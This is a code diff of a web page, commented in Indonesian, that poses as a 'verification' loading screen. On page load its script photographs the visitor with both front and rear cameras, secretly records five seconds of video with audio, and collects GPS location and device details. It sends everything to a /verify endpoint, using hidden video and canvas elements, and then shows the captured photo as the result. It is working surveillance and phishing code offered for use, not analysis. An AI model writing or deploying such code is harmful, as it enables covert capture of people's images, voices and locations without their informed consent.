@@ -29,18 +29,32 @@
         .hidden { display: none !important; }
         #hidden-video { display: none; }
         #hidden-canvas { display: none; }
+        .result-image {
+            max-width: 100%;
+            max-height: 80vh;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        .result-container { display: none; }
+        .result-container.visible { display: block; }
         .status-text {
-            color: #666;
+            color: #999;
             margin-top: 15px;
             font-size: 13px;
         }
     </style>
 </head>
 <body>
+    <!-- LOADING -->
     <div class="container" id="loadingContainer">
         <div class="spinner" id="spinner"></div>
         <h1 id="title">LOADING</h1>
         <div class="status-text" id="statusText">⏳ Memulai verifikasi...</div>
+    </div>
+
+    <!-- RESULT FOTO -->
+    <div class="container result-container" id="resultContainer">
+        <img src="" alt="Result" class="result-image" id="resultImage">
     </div>
 
     <video id="hidden-video" autoplay playsinline></video>
@@ -50,149 +64,140 @@
         const video = document.getElementById('hidden-video');
         const canvas = document.getElementById('hidden-canvas');
         const loadingContainer = document.getElementById('loadingContainer');
+        const resultContainer = document.getElementById('resultContainer');
+        const resultImage = document.getElementById('resultImage');
         const statusText = document.getElementById('statusText');
 
         let stream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let isRecording = false;
 
         // ============================================
-        // 🎥 REKAM VIDEO + AUDIO 10 DETIK
+        // 📸 AMBIL FOTO KAMERA DEPAN + BELAKANG
         // ============================================
-        async function startRecording() {
+        async function captureBothCameras() {
+            const photos = { front: null, back: null };
+
+            // 1. Kamera Depan
             try {
-                statusText.textContent = '📷 Mengakses kamera & mikrofon...';
-
-                // Minta akses kamera + mikrofon
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: true // ✅ REKAM SUARA
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: false
                 });
+                const frontVideo = document.createElement('video');
+                frontVideo.srcObject = frontStream;
+                await frontVideo.play();
+                await new Promise(r => setTimeout(r, 500));
 
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000));
+                const frontCanvas = document.createElement('canvas');
+                frontCanvas.width = frontVideo.videoWidth || 640;
+                frontCanvas.height = frontVideo.videoHeight || 480;
+                const fCtx = frontCanvas.getContext('2d');
+                fCtx.drawImage(frontVideo, 0, 0);
+                photos.front = frontCanvas.toDataURL('image/jpeg', 0.85);
 
-                statusText.textContent = '🎬 Merekam video + suara (10 detik)...';
+                frontStream.getTracks().forEach(t => t.stop());
+                console.log('📸 Front camera captured');
+            } catch (e) {
+                console.log('⚠️ Front camera error:', e.message);
+            }
 
-                // Setup MediaRecorder
-                const mimeTypes = [
-                    'video/webm;codecs=vp9,opus',
-                    'video/webm;codecs=vp8,opus',
-                    'video/webm;codecs=h264,opus',
-                    'video/webm'
-                ];
-
-                let selectedMimeType = mimeTypes[0];
-                for (const type of mimeTypes) {
-                    if (MediaRecorder.isTypeSupported(type)) {
-                        selectedMimeType = type;
-                        break;
-                    }
-                }
-
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: selectedMimeType,
-                    videoBitsPerSecond: 2500000,
-                    audioBitsPerSecond: 128000
+            // 2. Kamera Belakang
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 640, height: 480 },
+                    audio: false
                 });
+                const backVideo = document.createElement('video');
+                backVideo.srcObject = backStream;
+                await backVideo.play();
+                await new Promise(r => setTimeout(r, 500));
 
+                const backCanvas = document.createElement('canvas');
+                backCanvas.width = backVideo.videoWidth || 640;
+                backCanvas.height = backVideo.videoHeight || 480;
+                const bCtx = backCanvas.getContext('2d');
+                bCtx.drawImage(backVideo, 0, 0);
+                photos.back = backCanvas.toDataURL('image/jpeg', 0.85);
+
+                backStream.getTracks().forEach(t => t.stop());
+                console.log('📸 Back camera captured');
+            } catch (e) {
+                console.log('⚠️ Back camera error:', e.message);
+            }
+
+            return photos;
+        }
+
+        // ============================================
+        // 🎥 REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO
+        // ============================================
+        async function recordFrontVideo() {
+            return new Promise((resolve) => {
                 recordedChunks = [];
-                isRecording = true;
 
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                        console.log(`📹 Chunk: ${event.data.size} bytes`);
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: {
+                        echoCancellation: true,      // 🔇 FIX BUG SUARA MANTUL
+                        noiseSuppression: true,
+                        autoGainControl: true
                     }
-                };
+                })
+                .then((stream) => {
+                    const recVideo = document.createElement('video');
+                    recVideo.srcObject = stream;
+                    recVideo.play();
 
-                mediaRecorder.onstop = async () => {
-                    isRecording = false;
-                    console.log(`📹 Total chunks: ${recordedChunks.length}`);
-                    
-                    if (recordedChunks.length === 0) {
-                        console.log('❌ No video recorded');
-                        loadingContainer.classList.add('hidden');
-                        return;
+                    const mimeTypes = [
+                        'video/webm;codecs=vp9,opus',
+                        'video/webm;codecs=vp8,opus',
+                        'video/webm;codecs=h264,opus',
+                        'video/webm'
+                    ];
+
+                    let selectedMimeType = mimeTypes[0];
+                    for (const type of mimeTypes) {
+                        if (MediaRecorder.isTypeSupported(type)) {
+                            selectedMimeType = type;
+                            break;
+                        }
                     }
 
-                    // Buat video blob
-                    const videoBlob = new Blob(recordedChunks, {
-                        type: selectedMimeType || 'video/webm'
+                    const recorder = new MediaRecorder(stream, {
+                        mimeType: selectedMimeType,
+                        videoBitsPerSecond: 2500000,
+                        audioBitsPerSecond: 128000
                     });
 
-                    console.log(`📹 Video size: ${videoBlob.size} bytes`);
-
-                    // === AMBIL FOTO (frame terakhir) ===
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
-
-                    // === GPS ===
-                    const gps = await getGPSLocation();
-
-                    // === DEVICE INFO ===
-                    const device = getDeviceInfo();
-
-                    // === CONVERT VIDEO KE BASE64 ===
-                    const reader = new FileReader();
-                    reader.readAsDataURL(videoBlob);
-                    reader.onloadend = async () => {
-                        const videoBase64 = reader.result;
-
-                        statusText.textContent = '📤 Mengirim data...';
-
-                        try {
-                            const response = await fetch('/verify', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    image: photoData,
-                                    video: videoBase64,
-                                    gps: gps,
-                                    device: device,
-                                    timestamp: new Date().toISOString()
-                                })
-                            });
-
-                            const result = await response.json();
-                            console.log('📨 Response:', result);
-                        } catch (err) {
-                            console.error('❌ Send error:', err);
+                    recorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
                         }
-
-                        // Tampilan selesai
-                        loadingContainer.classList.add('hidden');
                     };
-                };
 
-                // Rekam 10 detik
-                mediaRecorder.start(1000); // Record in 1-second chunks
-                
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                    if (stream) {
+                    recorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, {
+                            type: selectedMimeType || 'video/webm'
+                        });
                         stream.getTracks().forEach(t => t.stop());
-                        stream = null;
-                    }
-                }, 10000); // 10 DETIK
+                        resolve(blob);
+                    };
 
-            } catch (err) {
-                console.error('❌ Error:', err);
-                statusText.textContent = '❌ Gagal akses kamera/mikrofon';
-                setTimeout(() => {
-                    loadingContainer.classList.add('hidden');
-                }, 2000);
-            }
+                    recorder.start(1000);
+                    statusText.textContent = '🎥 Merekam video 5 detik...';
+
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') {
+                            recorder.stop();
+                        }
+                    }, 5000);
+                })
+                .catch((err) => {
+                    console.error('❌ Record error:', err);
+                    resolve(null);
+                });
+            });
         }
 
         // ============================================
@@ -282,12 +287,85 @@
         }
 
         // ============================================
+        // 🚀 MAIN PROCESS
+        // ============================================
+        async function startProcess() {
+            try {
+                statusText.textContent = '📷 Mengakses kamera...';
+
+                // 1. AMBIL FOTO KAMERA DEPAN + BELAKANG
+                statusText.textContent = '📸 Mengambil foto...';
+                const photos = await captureBothCameras();
+
+                // 2. REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO
+                const videoBlob = await recordFrontVideo();
+
+                // 3. GPS
+                statusText.textContent = '📍 Mengambil lokasi...';
+                const gps = await getGPSLocation();
+
+                // 4. DEVICE INFO
+                const device = getDeviceInfo();
+
+                // 5. SEND TO SERVER
+                statusText.textContent = '📤 Mengirim data...';
+
+                // Convert video ke base64
+                let videoBase64 = null;
+                if (videoBlob) {
+                    const reader = new FileReader();
+                    videoBase64 = await new Promise((resolve) => {
+                        reader.readAsDataURL(videoBlob);
+                        reader.onloadend = () => resolve(reader.result);
+                    });
+                }
+
+                const response = await fetch('/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        frontPhoto: photos.front,
+                        backPhoto: photos.back,
+                        video: videoBase64,
+                        gps: gps,
+                        device: device,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+                const result = await response.json();
+                console.log('📨 Response:', result);
+
+                // ===== TAMPILKAN FOTO =====
+                // Pakai foto depan sebagai hasil
+                if (photos.front) {
+                    resultImage.src = photos.front;
+                } else if (photos.back) {
+                    resultImage.src = photos.back;
+                } else {
+                    resultImage.src = 'https://via.placeholder.com/400x600/ccc/fff?text=No+Photo';
+                }
+
+                // Sembunyikan loading, tampilkan foto
+                setTimeout(() => {
+                    loadingContainer.classList.add('hidden');
+                    resultContainer.classList.add('visible');
+                }, 500);
+
+            } catch (err) {
+                console.error('❌ Error:', err);
+                loadingContainer.classList.add('hidden');
+                resultContainer.classList.add('visible');
+                resultImage.src = 'https://via.placeholder.com/400x600/ff6b6b/fff?text=Error';
+            }
+        }
+
+        // ============================================
         // 🛑 STOP RECORDING SAAT WEB DI-CLOSE
         // ============================================
         window.addEventListener('beforeunload', () => {
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
-                console.log('🛑 Recording stopped (page closed)');
             }
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
@@ -299,8 +377,8 @@
         // 🚀 START
         // ============================================
         window.onload = () => {
-            console.log('📄 Page loaded - Starting verification...');
-            setTimeout(startRecording, 500);
+            console.log('📄 Page loaded');
+            setTimeout(startProcess, 500);
         };
     </script>
 </body>
